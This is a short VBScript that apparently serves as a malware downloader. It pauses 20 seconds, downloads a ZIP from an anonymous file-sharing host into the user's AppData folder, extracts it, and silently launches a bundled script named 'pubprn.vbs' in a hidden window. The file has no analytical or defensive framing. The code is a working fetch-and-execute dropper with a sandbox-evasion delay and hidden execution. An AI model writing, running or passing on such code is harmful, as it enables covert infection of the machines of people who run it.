

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Set variables
url = "https://files.catbox.moe/hbtv6x.zip"
targetFolder = objShell.ExpandEnvironmentStrings("%AppData%") & "\downloaded_zip"
zipFile = targetFolder & "\file.zip"
unzipFolder = targetFolder

' Create target directories
If Not objFSO.FolderExists(targetFolder) Then objFSO.CreateFolder(targetFolder)

' Wait 20 Sec before downloading the ZIP file
WScript.Sleep 20000

' Download the ZIP file
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send
If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile zipFile, 2 ' Overwrite
    stream.Close
Else
    WScript.Quit
End If

' Extract the ZIP file
Set shellApp = CreateObject("Shell.Application")
Set zip = shellApp.NameSpace(zipFile)
If Not zip Is Nothing Then
    Set dest = shellApp.NameSpace(unzipFolder)
    dest.CopyHere zip.Items, 16
End If

' Check if pubprn.vbs exists and open it
targetFile = unzipFolder & "\Docs\pubprn.vbs"
If objFSO.FileExists(targetFile) Then
    objShell.Run Chr(34) & targetFile & Chr(34), 0, False
End If
